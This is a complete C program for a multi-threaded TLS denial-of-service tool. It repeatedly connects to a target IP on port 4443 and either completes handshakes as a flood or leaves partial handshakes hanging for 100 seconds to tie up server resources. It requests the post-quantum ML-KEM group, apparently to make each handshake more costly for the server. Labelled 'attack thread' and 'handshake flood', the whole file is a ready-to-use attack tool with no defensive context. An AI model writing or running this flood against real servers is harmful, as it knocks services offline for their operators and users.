#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <pthread.h>
#include <string.h>

#define DEFAULT_IP "127.0.0.1"
#define PORT 4443

SSL_CTX *ctx;

typedef struct {
    char target_ip[64];
    int mode; // 1 = full handshake, 2 = partial
} thread_args;

/* ========================== */
/* ATTACK THREAD */
/* ========================== */
void* attack_thread(void* arg)
{
    thread_args *targs = (thread_args*)arg;

    while (1)
    {
        int sock = socket(AF_INET, SOCK_STREAM, 0);

        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(PORT);
        inet_pton(AF_INET, targs->target_ip, &addr.sin_addr);

        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0)
            continue;

        SSL *ssl = SSL_new(ctx);
        SSL_set_fd(ssl, sock);

        if (targs->mode == 1)
        {
            /* FULL HANDSHAKE FLOOD */
            SSL_connect(ssl);
        }
        else if (targs->mode == 2)
        {
            /* PARTIAL HANDSHAKE */
            SSL_set_connect_state(ssl);
            SSL_do_handshake(ssl);

            /* hold connection */
            sleep(100);
        }

        SSL_shutdown(ssl);
        SSL_free(ssl);
        close(sock);
    }
}

/* ========================== */
/* MAIN */
/* ========================== */
int main(int argc, char **argv)
{
    if (argc < 4)
    {
        printf("Usage: %s <threads> <mode> <target_ip>\n", argv[0]);
        printf("mode: 1=handshake flood, 2=partial\n");
        return 1;
    }

    int threads = atoi(argv[1]);
    int mode = atoi(argv[2]);
    char *target_ip = argv[3];

    SSL_library_init();
    ctx = SSL_CTX_new(TLS_client_method());

    /* PQC group */
    SSL_CTX_set1_groups_list(ctx, "mlkem768");

    pthread_t t[threads];

    thread_args args;
    strcpy(args.target_ip, target_ip);
    args.mode = mode;

    for (int i = 0; i < threads; i++)
        pthread_create(&t[i], NULL, attack_thread, &args);

    for (int i = 0; i < threads; i++)
        pthread_join(t[i], NULL);

    return 0;
}